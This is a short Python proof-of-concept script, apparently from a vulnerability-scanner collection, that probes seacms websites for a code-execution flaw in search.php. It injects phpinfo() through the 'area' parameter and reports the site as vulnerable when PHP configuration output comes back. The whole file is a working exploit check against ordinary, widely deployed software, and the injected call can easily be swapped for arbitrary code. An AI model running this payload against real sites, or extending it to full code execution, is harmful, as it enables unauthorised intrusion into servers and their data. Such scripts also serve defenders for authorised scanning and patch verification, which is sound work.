#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: seacms search.php 代码执行
referer: unknown
author: Lucifer
description: 文件search.php中,参数area存在代码执行。
'''
import sys
import requests



class seacms_search_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/search.php?searchtype=5&tid=&area=phpinfo()"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                return "[+]存在seacms search.php代码注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = seacms_search_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()